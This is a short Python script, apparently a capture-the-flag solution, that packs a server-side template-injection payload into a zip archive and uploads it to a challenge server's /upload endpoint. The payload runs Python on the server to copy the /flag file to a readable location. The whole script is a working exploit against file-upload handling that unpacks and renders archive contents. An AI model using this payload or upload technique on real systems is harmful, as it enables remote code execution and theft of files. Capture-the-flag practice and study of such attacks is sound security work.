import requests
import io
import os
import zipfile
#写入
payloadFileName = "payload.txt"
payloadContent = "% import shutil; shutil.copy('/flag', './aaa')"

# #压缩。内存，不写磁盘法
# zipBuffer = io.BytesIO()
# with zipfile.ZipFile(zipBuffer,'w',zipfile.ZIP_DEFLATED) as zip_file:
#     zip_file.writestr(payloadFileName,payloadContent)
# zipBuffer.seek(0)

# 压缩，写磁盘
with zipfile.ZipFile('payload.zip','w',zipfile.ZIP_DEFLATED) as f:
    f.writestr(payloadFileName,payloadContent)

#上传zip
url = "http://challenge.xinshi.fun:30306"
payload = "/upload"

#TODO
with open('payload.zip', 'rb') as file:
    files = {'file': ('payload.zip', file)}  # 名字要和前端一致
    res = requests.post(url=(url + payload), files=files)

print("over")
print(res.text)


